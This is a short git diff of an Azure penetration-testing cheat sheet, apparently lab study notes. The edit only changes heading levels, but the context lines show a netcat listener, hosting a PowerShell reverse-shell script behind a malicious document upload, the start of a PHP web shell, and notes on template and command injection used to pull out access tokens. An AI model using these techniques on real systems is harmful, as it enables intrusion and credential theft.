@@ -410,7 +410,7 @@ C:\AzAD\Tools\netcat-win32-1.12\nc64.exe -lvp 4444
 - Before you upload the malicious ```.doc``` make sure you have hosted ```Invoke-PowerShellTcp.ps1``` in ```C:\xampp\htdocs```!!!
 
 ## App Services
-#### Insecure File Upload
+### Insecure File Upload
 We find a vulnerable form to upload files into, now lets upload hilarious shell:-
 ```
 <?php 
@@ -481,7 +481,7 @@ $URI = 'https://management.azure.com/subscriptions/b413826f-108d-4049-8c11-d52d5
 
 THIS GIVES US ```{Microsoft.Compute/virtualMachines/runCommand/action}```
 
-#### Server Side Template Injection (SSTI)
+### Server Side Template Injection (SSTI)
 
 - If we know the app is running a template, we can do OS injection. 
 ```
@@ -508,7 +508,7 @@ Connect-AzAccount -AccessToken $token -AccountId 2e91a4fe-a0f2-46ee-8214-fa2ff6a
 Get-AzResource
 ```
 
-#### Command Injection
+### Command Injection
 a lot of the time the EndOfLine or Special Character is a ```;``` - so just put a semi-colon and a system call after it to test!
 - This website says when we upload files it goes to the ```/tmp``` folder for scanning.. we can upload our python script to extract the tokens and run it from the vulnerable form:
 ```
